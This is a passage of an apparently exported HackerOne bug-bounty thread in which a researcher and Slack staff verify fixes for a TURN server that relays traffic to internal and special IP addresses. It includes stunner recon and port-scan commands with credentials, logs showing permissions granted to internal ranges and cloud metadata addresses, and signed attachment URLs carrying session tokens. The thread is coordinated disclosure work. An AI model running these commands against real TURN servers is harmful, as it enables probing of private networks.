      "message": "@fyunaz Thought I'd follow up. What I meant was that according to my tests, it seemed the latest solution on your dev environment was blocking legitimate access. Essentially it seemed to me that the TURN servers both on live and dev were blocking all traffic not just that towards internal/special IP addresses. This would would block legitimate calls as well as attacks - which is usually undesirable. \n\nPerhaps my test was incorrect, or your engineers had applied such a solution where the TURN server was blocking everything. I'd be interested in knowing which one is which. \n\nI have just tested on the live again and could see that the behavior now is that TCP is disabled while special / internal IP addresses on UDP are still allowed. Do let me know if you would like me to test a different fix on your dev environment - and if so please give me a new address as the previous one is no longer valid.",
      "automated_response": false,
      "created_at": "2018-04-18T18:15:05.806Z",
      "updated_at": "2018-04-18T18:15:05.806Z",
      "actor": {
        "username": "sandrogauci",
        "cleared": false,
        "verified": false,
        "url": "/sandrogauci",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/h1r9ltrlx7r5drucw3cbori5g2mx/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "slack"
    },
    {
      "id": 2630027,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "@sandrogauci The dev instance that we shared with you should have the fix which only blocks internal/special IP addresses. It shouldn't block all TURN traffics. We have deployed the same patch to all of our production server, if you are testing the prod instance then you are testing the same patch. Are you confirmed that you are still able to use our TURN server to proxy to our  internal network using UDP protocol? Can you please provide more info on how you reproduce the issue? Another POC video would be great. Thanks!",
      "automated_response": false,
      "created_at": "2018-04-18T19:20:38.536Z",
      "updated_at": "2018-04-18T19:26:53.633Z",
      "actor": {
        "username": "fyunaz",
        "cleared": false,
        "verified": false,
        "url": "/fyunaz",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "slack"
    },
    {
      "id": 2630583,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "@sandrogauci We have additional questions from the team. Can you please confirm if you can connect to multiple internal IP addresses or just one special IP address using the UDP protocol in your last test? Were you able to get any response from any internal TCP port with UDP protocol? \n\nWe've spun up another dev instance with another patch for you to test `z-slack-calls-orca-research1.slack-core.com`. Can you please confirm if this patch fix the issue?",
      "automated_response": false,
      "created_at": "2018-04-18T22:12:37.524Z",
      "updated_at": "2018-04-18T22:12:37.524Z",
      "actor": {
        "username": "fyunaz",
        "cleared": false,
        "verified": false,
        "url": "/fyunaz",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "slack"
    },
    {
      "id": 2637550,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "@fyunaz thanks for spinning that test environment. \n\nI have summarised your comments as follows:\n\n\n- dev instance should only block special IP addresses and not all traffic\n- same solution was deployed on production too\n- please confirm with video that you are able to proxy to our internal network using UDP, with UDP response\n- were you able to get a response from TCP port via TURN UDP?\n- we have a test dev instance for your testing `z-slack-calls-orca-research1.slack-core.com`\n\nMy responses for each of the above:\n\n- that is not what my tests seem to indicate \n- production now seems to block TCP but not UDP on special addresses - see  the below tests\n- Please find the output from our tests and attached pcaps which I hope can help; do let me know if this is not enough and I'll dedicate some time for a video showing the same exact thing\n- No we were not able to get a response from TCP port through TURN UDP; the protocol itself does not allow that\n- thanks for the test dev instance\n\nWhen I run our reconnaissance tool on the live environment, I see the following results:\n\n```\nstunner recon --username '1524160678:U3VE3T72Q' --password 'HrVL1a/ZswyyLH52nW6xql0/CTo=' --server udp://slack-calls-orca-bru-qxb0.slack-core.com:22466                                                                                   \n\n\nstunner v0.1\nStarted on 2018-04-18T19:59:57+02:00\n\nstunner/proto> udp connection to slack-calls-orca-bru-qxb0.slack-core.com:22466 successful\nstunner/proto> tcp connection to slack-calls-orca-bru-qxb0.slack-core.com:22466 successful\nstunner/banners> Software banner: None\nstunner/banners> Realm: slack.com\nstunner/allocate> udp allocate (invalid auth) successful\nstunner/allocate> tcp allocate (invalid auth) successful\nstunner/allocate> udp recon long term creds authentication successful\nstunner/allocate> udp reflexive transport address 91.64.185.21:40097\nstunner/allocate> tcp recon long term creds authentication failed\nstunner/allocate> udp recon short term creds authentication failed\nstunner/allocate> tcp recon short term creds authentication failed\nstunner/binding> udp recon binding successful\nstunner/binding> reflexive transport address 91.64.185.21:58566\nstunner/binding> tcp recon binding successful\nstunner/binding> reflexive transport address 91.64.185.21:37588\nstunner/channelbind> udp recon ChannelBind 8.8.8.8:80 successful\nstunner/channelbind> tcp recon ChannelBind 8.8.8.8:80 failed\nstunner/channelbind> udp recon ChannelBind 169.254.169.254:80 successful\nstunner/channelbind> tcp recon ChannelBind 169.254.169.254:80 failed\nstunner/channelbind> udp recon ChannelBind 127.0.0.1:80 successful\nstunner/channelbind> tcp recon ChannelBind 127.0.0.1:80 failed\nstunner/channelbind> udp recon ChannelBind 0.0.0.0:80 successful\nstunner/channelbind> tcp recon ChannelBind 0.0.0.0:80 failed\nstunner/channelbind> udp recon ChannelBind 10.0.0.1:80 successful\nstunner/channelbind> tcp recon ChannelBind 10.0.0.1:80 failed\nstunner/channelbind> udp recon ChannelBind 100.64.0.0:80 successful\nstunner/channelbind> tcp recon ChannelBind 100.64.0.0:80 failed\nstunner/channelbind> udp recon ChannelBind 169.254.0.1:80 successful\nstunner/channelbind> tcp recon ChannelBind 169.254.0.1:80 failed\nstunner/channelbind> udp recon ChannelBind 192.0.0.1:80 successful\nstunner/channelbind> tcp recon ChannelBind 192.0.0.1:80 failed\nstunner/channelbind> udp recon ChannelBind 192.0.2.1:80 successful\nstunner/channelbind> tcp recon ChannelBind 192.0.2.1:80 failed\nstunner/channelbind> udp recon ChannelBind 192.88.99.1:80 successful\nstunner/channelbind> tcp recon ChannelBind 192.88.99.1:80 failed\nstunner/channelbind> udp recon ChannelBind 192.168.0.1:80 successful\nstunner/channelbind> tcp recon ChannelBind 192.168.0.1:80 failed\nstunner/channelbind> udp recon ChannelBind 198.18.0.1:80 successful\nstunner/channelbind> tcp recon ChannelBind 198.18.0.1:80 failed\nstunner/channelbind> udp recon ChannelBind 198.51.100.1:80 successful\nstunner/channelbind> tcp recon ChannelBind 198.51.100.1:80 failed\nstunner/channelbind> udp recon ChannelBind 203.0.113.1:80 successful\nstunner/channelbind> tcp recon ChannelBind 203.0.113.1:80 failed\nstunner/channelbind> udp recon ChannelBind 224.0.0.1:80 successful\nstunner/channelbind> tcp recon ChannelBind 224.0.0.1:80 failed\nstunner/channelbind> udp recon ChannelBind 240.0.0.1:80 successful\nstunner/channelbind> tcp recon ChannelBind 240.0.0.1:80 failed\nstunner/channelbind> udp recon ChannelBind 255.255.255.255:80 successful\nstunner/channelbind> tcp recon ChannelBind 255.255.255.255:80 failed\nstunner/createpermission> udp recon CreatePermission 8.8.8.8:80 successful\nstunner/createpermission> tcp recon CreatePermission 8.8.8.8:80 failed\nstunner/createpermission> udp recon CreatePermission 169.254.169.254:80 successful\nstunner/createpermission> tcp recon CreatePermission 169.254.169.254:80 failed\nstunner/createpermission> udp recon CreatePermission 127.0.0.1:80 successful\nstunner/createpermission> tcp recon CreatePermission 127.0.0.1:80 failed\nstunner/createpermission> udp recon CreatePermission 0.0.0.0:80 successful\nstunner/createpermission> tcp recon CreatePermission 0.0.0.0:80 failed\nstunner/createpermission> udp recon CreatePermission 10.0.0.1:80 successful\nstunner/createpermission> tcp recon CreatePermission 10.0.0.1:80 failed\nstunner/createpermission> udp recon CreatePermission 100.64.0.0:80 successful\nstunner/createpermission> tcp recon CreatePermission 100.64.0.0:80 failed\nstunner/createpermission> udp recon CreatePermission 169.254.0.1:80 successful\nstunner/createpermission> tcp recon CreatePermission 169.254.0.1:80 failed\nstunner/createpermission> udp recon CreatePermission 192.0.0.1:80 successful\nstunner/createpermission> tcp recon CreatePermission 192.0.0.1:80 failed\nstunner/createpermission> udp recon CreatePermission 192.0.2.1:80 successful\nstunner/createpermission> tcp recon CreatePermission 192.0.2.1:80 failed\nstunner/createpermission> udp recon CreatePermission 192.88.99.1:80 successful\nstunner/createpermission> tcp recon CreatePermission 192.88.99.1:80 failed\nstunner/createpermission> udp recon CreatePermission 192.168.0.1:80 successful\nstunner/createpermission> tcp recon CreatePermission 192.168.0.1:80 failed\nstunner/createpermission> udp recon CreatePermission 198.18.0.1:80 successful\nstunner/createpermission> tcp recon CreatePermission 198.18.0.1:80 failed\nstunner/createpermission> udp recon CreatePermission 198.51.100.1:80 successful\nstunner/createpermission> tcp recon CreatePermission 198.51.100.1:80 failed\nstunner/createpermission> udp recon CreatePermission 203.0.113.1:80 successful\nstunner/createpermission> tcp recon CreatePermission 203.0.113.1:80 failed\nstunner/createpermission> udp recon CreatePermission 224.0.0.1:80 successful\nstunner/createpermission> tcp recon CreatePermission 224.0.0.1:80 failed\nstunner/createpermission> udp recon CreatePermission 240.0.0.1:80 successful\nstunner/createpermission> tcp recon CreatePermission 240.0.0.1:80 failed\nstunner/createpermission> udp recon CreatePermission 255.255.255.255:80 successful\nstunner/createpermission> tcp recon CreatePermission 255.255.255.255:80 failed\n```\nThis means that the TURN `CreatePermission` command is allowed on UDP for all the special addresses. TCP has been disabled since our initial report and therefore we get failure for all instances. To prove that this is still indeed a potential security problem, we ran a port 53 DNS scan as follows:\n\n\n```\nstunner turn peer scan  --username '1524195624:U3VE3T72Q' --password 'R0vf5RdFuqHO/isgt/uA7oLcNdw=' --server udp://slack-calls-orca-bru-qxb0.slack-core.com:22466 --scan-port-range 53 \n\n\nstunner v0.1\nStarted on 2018-04-19T10:40:32+02:00\n\nstunner> Scanning 127.0.0.1/32 for 53\n\nResult from 127.0.0.1:53\n([]uint8) (len=128 cap=1000) {\n 00000000  40 b3 81 80 00 01 00 06  00 00 00 00 03 77 77 77  |@............www|\n 00000010  06 67 6f 6f 67 6c 65 03  63 6f 6d 00 00 01 00 01  |.google.com.....|\n 00000020  c0 0c 00 01 00 01 00 00  00 7f 00 04 4a 7d ce 93  |............J}..|\n 00000030  c0 0c 00 01 00 01 00 00  00 7f 00 04 4a 7d ce 63  |............J}.c|\n 00000040  c0 0c 00 01 00 01 00 00  00 7f 00 04 4a 7d ce 67  |............J}.g|\n 00000050  c0 0c 00 01 00 01 00 00  00 7f 00 04 4a 7d ce 6a  |............J}.j|\n 00000060  c0 0c 00 01 00 01 00 00  00 7f 00 04 4a 7d ce 69  |............J}.i|\n 00000070  c0 0c 00 01 00 01 00 00  00 7f 00 04 4a 7d ce 68  |............J}.h|\n}\n\nstunner [info]> 1 payloads sent\n1 seconds remaining until shutdown %               \n\n```\n\n\n\n\n\n```\nstunner turn peer scan  --username '1524195624:U3VE3T72Q' --password 'R0vf5RdFuqHO/isgt/uA7oLcNdw=' --server udp://slack-calls-orca-bru-qxb0.slack-core.com:22466 --scan-port-range 53 --scan-ip-range 10.33.0.96\n\n\nstunner v0.1\nStarted on 2018-04-19T10:58:15+02:00\n\nstunner> Scanning 10.33.0.96 for 53\n\nstunner [info]> 1 payloads sent\nResult from 10.33.0.96:53\n([]uint8) (len=128 cap=1000) {\n 00000000  40 b3 81 80 00 01 00 06  00 00 00 00 03 77 77 77  |@............www|\n 00000010  06 67 6f 6f 67 6c 65 03  63 6f 6d 00 00 01 00 01  |.google.com.....|\n 00000020  c0 0c 00 01 00 01 00 00  00 12 00 04 4a 7d ce 68  |............J}.h|\n 00000030  c0 0c 00 01 00 01 00 00  00 12 00 04 4a 7d ce 69  |............J}.i|\n 00000040  c0 0c 00 01 00 01 00 00  00 12 00 04 4a 7d ce 93  |............J}..|\n 00000050  c0 0c 00 01 00 01 00 00  00 12 00 04 4a 7d ce 67  |............J}.g|\n 00000060  c0 0c 00 01 00 01 00 00  00 12 00 04 4a 7d ce 6a  |............J}.j|\n 00000070  c0 0c 00 01 00 01 00 00  00 12 00 04 4a 7d ce 63  |............J}.c|\n}\n```\n\nThe reconnaissance tool was also run on your dev environment and it gave the below output indicating that all traffic is being blocked, including traffic meant to go to an internet IP address such as Google's `8.8.8.8`. Log below:\n\n\n```\nstunner recon --username '1524195624:U3VE3T72Q' --password 'R0vf5RdFuqHO/isgt/uA7oLcNdw=' --server udp://z-slack-calls-orca-research1.slack-core.com:22466\n\nstunner v0.1\nStarted on 2018-04-19T10:37:18+02:00\n\nstunner/proto> udp connection to z-slack-calls-orca-research1.slack-core.com:22466 successful\nstunner/proto> tcp connection to z-slack-calls-orca-research1.slack-core.com:22466 successful\nstunner/banners> Software banner: None\nstunner/banners> Realm: slack.com\nstunner/allocate> udp allocate (invalid auth) successful\nstunner/allocate> tcp allocate (invalid auth) successful\nstunner/allocate> udp recon long term creds authentication successful\nstunner/allocate> udp reflexive transport address 91.64.185.21:38635\nstunner/allocate> tcp recon long term creds authentication failed\nstunner/allocate> udp recon short term creds authentication failed\nstunner/allocate> tcp recon short term creds authentication failed\nstunner/binding> udp recon binding successful\nstunner/binding> reflexive transport address 91.64.185.21:51750\nstunner/binding> tcp recon binding successful\nstunner/binding> reflexive transport address 91.64.185.21:32972\nstunner/channelbind> udp recon ChannelBind 8.8.8.8:80 failed\nstunner/channelbind> tcp recon ChannelBind 8.8.8.8:80 failed\nstunner/channelbind> udp recon ChannelBind 169.254.169.254:80 failed\nstunner/channelbind> tcp recon ChannelBind 169.254.169.254:80 failed\nstunner/channelbind> udp recon ChannelBind 127.0.0.1:80 failed\nstunner/channelbind> tcp recon ChannelBind 127.0.0.1:80 failed\nstunner/channelbind> udp recon ChannelBind 0.0.0.0:80 failed\nstunner/channelbind> tcp recon ChannelBind 0.0.0.0:80 failed\nstunner/channelbind> udp recon ChannelBind 10.0.0.1:80 failed\nstunner/channelbind> tcp recon ChannelBind 10.0.0.1:80 failed\nstunner/channelbind> udp recon ChannelBind 100.64.0.0:80 failed\nstunner/channelbind> tcp recon ChannelBind 100.64.0.0:80 failed\nstunner/channelbind> udp recon ChannelBind 169.254.0.1:80 failed\nstunner/channelbind> tcp recon ChannelBind 169.254.0.1:80 failed\nstunner/channelbind> udp recon ChannelBind 192.0.0.1:80 failed\nstunner/channelbind> tcp recon ChannelBind 192.0.0.1:80 failed\nstunner/channelbind> udp recon ChannelBind 192.0.2.1:80 failed\nstunner/channelbind> tcp recon ChannelBind 192.0.2.1:80 failed\nstunner/channelbind> udp recon ChannelBind 192.88.99.1:80 failed\nstunner/channelbind> tcp recon ChannelBind 192.88.99.1:80 failed\nstunner/channelbind> udp recon ChannelBind 192.168.0.1:80 failed\nstunner/channelbind> tcp recon ChannelBind 192.168.0.1:80 failed\nstunner/channelbind> udp recon ChannelBind 198.18.0.1:80 failed\nstunner/channelbind> tcp recon ChannelBind 198.18.0.1:80 failed\nstunner/channelbind> udp recon ChannelBind 198.51.100.1:80 failed\nstunner/channelbind> tcp recon ChannelBind 198.51.100.1:80 failed\nstunner/channelbind> udp recon ChannelBind 203.0.113.1:80 failed\nstunner/channelbind> tcp recon ChannelBind 203.0.113.1:80 failed\nstunner/channelbind> udp recon ChannelBind 224.0.0.1:80 failed\nstunner/channelbind> tcp recon ChannelBind 224.0.0.1:80 failed\nstunner/channelbind> udp recon ChannelBind 240.0.0.1:80 failed\nstunner/channelbind> udp recon ChannelBind 255.255.255.255:80 failed\nstunner/channelbind> tcp recon ChannelBind 255.255.255.255:80 failed\nstunner/createpermission> udp recon CreatePermission 8.8.8.8:80 failed\nstunner/createpermission> tcp recon CreatePermission 8.8.8.8:80 failed\nstunner/createpermission> udp recon CreatePermission 169.254.169.254:80 failed\nstunner/createpermission> tcp recon CreatePermission 169.254.169.254:80 failed\nstunner/createpermission> udp recon CreatePermission 127.0.0.1:80 failed\nstunner/createpermission> tcp recon CreatePermission 127.0.0.1:80 failed\nstunner/createpermission> udp recon CreatePermission 0.0.0.0:80 failed\nstunner/createpermission> tcp recon CreatePermission 0.0.0.0:80 failed\nstunner/createpermission> udp recon CreatePermission 10.0.0.1:80 failed\nstunner/createpermission> tcp recon CreatePermission 10.0.0.1:80 failed\nstunner/createpermission> udp recon CreatePermission 100.64.0.0:80 failed\nstunner/createpermission> tcp recon CreatePermission 100.64.0.0:80 failed\nstunner/createpermission> udp recon CreatePermission 169.254.0.1:80 failed\nstunner/createpermission> tcp recon CreatePermission 169.254.0.1:80 failed\nstunner/createpermission> udp recon CreatePermission 192.0.0.1:80 failed\nstunner/createpermission> tcp recon CreatePermission 192.0.0.1:80 failed\nstunner/createpermission> udp recon CreatePermission 192.0.2.1:80 failed\nstunner/createpermission> tcp recon CreatePermission 192.0.2.1:80 failed\nstunner/createpermission> udp recon CreatePermission 192.88.99.1:80 failed\nstunner/createpermission> tcp recon CreatePermission 192.88.99.1:80 failed\nstunner/createpermission> udp recon CreatePermission 192.168.0.1:80 failed\nstunner/createpermission> tcp recon CreatePermission 192.168.0.1:80 failed\nstunner/createpermission> udp recon CreatePermission 198.18.0.1:80 failed\nstunner/createpermission> tcp recon CreatePermission 198.18.0.1:80 failed\nstunner/createpermission> udp recon CreatePermission 198.51.100.1:80 failed\nstunner/createpermission> tcp recon CreatePermission 198.51.100.1:80 failed\nstunner/createpermission> udp recon CreatePermission 203.0.113.1:80 failed\nstunner/createpermission> tcp recon CreatePermission 203.0.113.1:80 failed\nstunner/createpermission> udp recon CreatePermission 224.0.0.1:80 failed\nstunner/createpermission> tcp recon CreatePermission 224.0.0.1:80 failed\nstunner/createpermission> udp recon CreatePermission 240.0.0.1:80 failed\nstunner/createpermission> tcp recon CreatePermission 240.0.0.1:80 failed\nstunner/createpermission> udp recon CreatePermission 255.255.255.255:80 failed\nstunner/createpermission> tcp recon CreatePermission 255.255.255.255:80 failed\n1 seconds remaining until shutdown %                                              \n```\n\nAttached you will find two pcaps. One showing the DNS responses received from `127.0.0.1` and `10.33.0.96` on the live environment. Note that further research could indicate sensitive or vulnerable services on UDP so this is why I think its not just TCP that should be blocked for internal or special IP addresses.\n\nThe second pcap shows a similar test but done on the dev system that acutally blocks all traffic, including seemingly  legitimate traffic to `8.8.8.8`. This, I'm afraid, would lead to problems for calls behind NAT that require TURN. \n\nSo to summarize:\n\n1. Live system is not vulnerable anymore for TCP; but UDP remains open\n2. Dev system is not vulnerable for either TCP or UDP; but also appears to block legitimate traffic\n\n",
      "automated_response": false,
      "created_at": "2018-04-19T12:19:40.141Z",
      "updated_at": "2018-04-19T12:19:40.141Z",
      "actor": {
        "username": "sandrogauci",
        "cleared": false,
        "verified": false,
        "url": "/sandrogauci",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/h1r9ltrlx7r5drucw3cbori5g2mx/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "attachments": [
        {
          "id": 288621,
          "filename": "live-fix-port53-127.0.0.1-10.33.0.96-response.pcapng",
          "type": "application/octet-stream",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/288/621/e5fb72740969b47cc3e790340d4a3892fbc77f7b/live-fix-port53-127.0.0.1-10.33.0.96-response.pcapng?response-content-disposition=attachment%3B%20filename%3D%22live-fix-port53-127.0.0.1-10.33.0.96-response.pcapng%22%3B%20filename%2A%3DUTF-8%27%27live-fix-port53-127.0.0.1-10.33.0.96-response.pcapng&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6MB2MFGG%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T073159Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDAaCXVzLXdlc3QtMiJIMEYCIQCYIr2SSYJfi35%2Bx%2Fejzst0Y9ig0v%2FJscMh9NmdM4t5VAIhAM3tVHHjt2e0sz7iLl%2BDuXOX6%2B7Qkvgs1KealcH7ElMXKrIFCCkQAxoMMDEzNjE5Mjc0ODQ5IgxubweTaMPp5L8Q1YQqjwX98aLIa%2F1BpdVLQC%2BToIBwbGklZ8ygTNCI4x1qYQEmOGsQ1%2F6p4MCPMLXSqoXVF5QxpRt%2BdZrK%2FNcRu%2FY3QoE9gFJoqRHKBQN0hea7VJkz7uo3Rwjv0%2Bs1TjLNvF9Gx9DxVw5gmaNJzFBUsDj05h8b86dmkhqjUzC21gXGs9t4qXslxrGTOenOwfga0eb8fEHnz%2FUG0yD%2FjVQklap45v4C30R4WSycoTBHd2IKfDAZJaqt3smArxbtWItscCWCfFJ5YbB9hQ02lZMGvLB8srO38zC0kWDBR3RWPsI8%2FCT9AQl3xDcTmEbRo8%2BEfRAGkXLHOo5AKqatyHEmPm882mSsghu%2Brspdz%2FeqOhEpYUj4ySBMH0b17ZliROXJKxLzh%2BCpk4fUxbvq89yWnq1oE%2FG%2BGZ8LqH%2BHdDoUgMjnt03ecbuj8wAqebD0M9EeKqj1vXVd7ZWocJ%2FV6oYrm7S7UQivyKhDfuckG4YQxqwGm504IsXFkkTNFI0%2FbAlQyc8oZWIdoVgeThWvi6pw0uZ7M%2BmXEBvYfmy7YzbRIQolLeZ2Ib2tXdc%2Bn5HFgml1zzqu2ZZ8UvtnGce7z5fSnCBmszEnO8llVSoINOleTxGjyvKpO7VdXBdZ6vHaJIqLP4SNZcKEx5MZL7DunikcKcJc1Dh%2BeVNTGBTEwRQo2kmUtWbkmUUiASlDd8HgSnAP4RZOLdiDukVkx7gl6gOh42A5qWddn32TVRG2IDpeFfTYENewkfdTm7VCYmxkxmsP3Y%2Fcw%2BNkYV5PmiGgPIv2Zg9PDt27P3dzVbO0BkrT2UairLaxhj6VzUa%2BsdGMoet2DUfQzKVnGNHKxUFEljtFY%2FFiJHinwQ9Y75x2c9j9UzL1wI6TMI2luqgGOrABYyeNRUxeluFl7y58tZIFLbCliCc92oq3AvL8gskghuI3JnKg7R1ezYwY7GVa14ik6vEtnhisXGNuJh6mNjwDpIIr2%2BnDJR4O60ugIm%2B2U5%2B3g%2BQpzkDorZygbT57TjRGr122tik3dcMk17NAyWA%2FDaZNLlJwiU%2BS%2FxyTsJLLALvI9zlCoPT7U9wokT6nPEdV1VKFKSAm9jewkYUEeI%2FFWCVu2DqEd9C51abS8Y6I8lw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1649d770b2fb37776cb9239ec27fe392497bfcc841034bfc3abcfa2295f1f4d6"
        },
        {
          "id": 288620,
          "filename": "test-fix-port53-8.8.8.8-response.pcapng",
          "type": "application/octet-stream",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/288/620/d98f2c09728df8a88a2f7200f630a025e770bab5/test-fix-port53-8.8.8.8-response.pcapng?response-content-disposition=attachment%3B%20filename%3D%22test-fix-port53-8.8.8.8-response.pcapng%22%3B%20filename%2A%3DUTF-8%27%27test-fix-port53-8.8.8.8-response.pcapng&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6MB2MFGG%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T073159Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDAaCXVzLXdlc3QtMiJIMEYCIQCYIr2SSYJfi35%2Bx%2Fejzst0Y9ig0v%2FJscMh9NmdM4t5VAIhAM3tVHHjt2e0sz7iLl%2BDuXOX6%2B7Qkvgs1KealcH7ElMXKrIFCCkQAxoMMDEzNjE5Mjc0ODQ5IgxubweTaMPp5L8Q1YQqjwX98aLIa%2F1BpdVLQC%2BToIBwbGklZ8ygTNCI4x1qYQEmOGsQ1%2F6p4MCPMLXSqoXVF5QxpRt%2BdZrK%2FNcRu%2FY3QoE9gFJoqRHKBQN0hea7VJkz7uo3Rwjv0%2Bs1TjLNvF9Gx9DxVw5gmaNJzFBUsDj05h8b86dmkhqjUzC21gXGs9t4qXslxrGTOenOwfga0eb8fEHnz%2FUG0yD%2FjVQklap45v4C30R4WSycoTBHd2IKfDAZJaqt3smArxbtWItscCWCfFJ5YbB9hQ02lZMGvLB8srO38zC0kWDBR3RWPsI8%2FCT9AQl3xDcTmEbRo8%2BEfRAGkXLHOo5AKqatyHEmPm882mSsghu%2Brspdz%2FeqOhEpYUj4ySBMH0b17ZliROXJKxLzh%2BCpk4fUxbvq89yWnq1oE%2FG%2BGZ8LqH%2BHdDoUgMjnt03ecbuj8wAqebD0M9EeKqj1vXVd7ZWocJ%2FV6oYrm7S7UQivyKhDfuckG4YQxqwGm504IsXFkkTNFI0%2FbAlQyc8oZWIdoVgeThWvi6pw0uZ7M%2BmXEBvYfmy7YzbRIQolLeZ2Ib2tXdc%2Bn5HFgml1zzqu2ZZ8UvtnGce7z5fSnCBmszEnO8llVSoINOleTxGjyvKpO7VdXBdZ6vHaJIqLP4SNZcKEx5MZL7DunikcKcJc1Dh%2BeVNTGBTEwRQo2kmUtWbkmUUiASlDd8HgSnAP4RZOLdiDukVkx7gl6gOh42A5qWddn32TVRG2IDpeFfTYENewkfdTm7VCYmxkxmsP3Y%2Fcw%2BNkYV5PmiGgPIv2Zg9PDt27P3dzVbO0BkrT2UairLaxhj6VzUa%2BsdGMoet2DUfQzKVnGNHKxUFEljtFY%2FFiJHinwQ9Y75x2c9j9UzL1wI6TMI2luqgGOrABYyeNRUxeluFl7y58tZIFLbCliCc92oq3AvL8gskghuI3JnKg7R1ezYwY7GVa14ik6vEtnhisXGNuJh6mNjwDpIIr2%2BnDJR4O60ugIm%2B2U5%2B3g%2BQpzkDorZygbT57TjRGr122tik3dcMk17NAyWA%2FDaZNLlJwiU%2BS%2FxyTsJLLALvI9zlCoPT7U9wokT6nPEdV1VKFKSAm9jewkYUEeI%2FFWCVu2DqEd9C51abS8Y6I8lw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=cb66457784b5d9d459d6d2f48be84bf496c94aaccb45553d47a799630c63f27c"
        }
      ],
      "genius_execution_id": null,
      "team_handle": "slack"
    },
    {
      "id": 2638674,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "@sandrogauci Thanks for your detail response, we are looking into this.",
      "automated_response": false,
      "created_at": "2018-04-19T18:50:46.424Z",
      "updated_at": "2018-04-19T18:50:46.424Z",
      "actor": {
        "username": "fyunaz",
        "cleared": false,
        "verified": false,
        "url": "/fyunaz",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "slack"
    },
    {
      "id": 2641758,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "@sandrogauci We added a patch to the `z-slack-calls-orca-research1.slack-core.com` to make it work for a legitimate traffic. Can you please re-run the test to that host again and confirm that the vulnerability fixed and we are not blocking any legitimate traffic? \n\nThanks!",
      "automated_response": false,
      "created_at": "2018-04-19T23:30:27.209Z",
      "updated_at": "2018-04-19T23:30:27.209Z",
      "actor": {
        "username": "fyunaz",
        "cleared": false,
        "verified": false,
        "url": "/fyunaz",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "slack"
    },
    {
      "id": 2644724,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @fyunaz glad that it helped. I have rerun the tool on the new patch and yes it does reflect the recommended change, i.e. it looks like a correct fix. \n\nlines of interest from my test log:\n\n```\nstunner/proto> udp connection to z-slack-calls-orca-research1.slack-core.com:22466 successful\nstunner/proto> tcp connection to z-slack-calls-orca-research1.slack-core.com:22466 successful\nstunner/banners> Software banner: None\nstunner/banners> Realm: slack.com\nstunner/allocate> udp allocate (invalid auth) successful\nstunner/allocate> tcp allocate (invalid auth) successful\nstunner/allocate> udp recon long term creds authentication successful\nstunner/allocate> udp reflexive transport address 91.64.185.21:38458\n...\nstunner/createpermission> udp recon CreatePermission 8.8.8.8:80 successful\nstunner/createpermission> tcp recon CreatePermission 8.8.8.8:80 failed\nstunner/createpermission> udp recon CreatePermission 169.254.169.254:80 failed\nstunner/createpermission> tcp recon CreatePermission 169.254.169.254:80 failed\nstunner/createpermission> udp recon CreatePermission 127.0.0.1:80 failed\nstunner/createpermission> tcp recon CreatePermission 127.0.0.1:80 failed\nstunner/createpermission> udp recon CreatePermission 0.0.0.0:80 failed\nstunner/createpermission> tcp recon CreatePermission 0.0.0.0:80 failed\nstunner/createpermission> udp recon CreatePermission 10.0.0.1:80 failed\nstunner/createpermission> tcp recon CreatePermission 10.0.0.1:80 failed\nstunner/createpermission> udp recon CreatePermission 100.64.0.0:80 failed\nstunner/createpermission> tcp recon CreatePermission 100.64.0.0:80 failed\nstunner/createpermission> udp recon CreatePermission 169.254.0.1:80 failed\nstunner/createpermission> tcp recon CreatePermission 169.254.0.1:80 failed\nstunner/createpermission> udp recon CreatePermission 192.0.0.1:80 failed\nstunner/createpermission> tcp recon CreatePermission 192.0.0.1:80 failed\nstunner/createpermission> udp recon CreatePermission 192.0.2.1:80 failed\nstunner/createpermission> tcp recon CreatePermission 192.0.2.1:80 failed\nstunner/createpermission> udp recon CreatePermission 192.88.99.1:80 failed\nstunner/createpermission> tcp recon CreatePermission 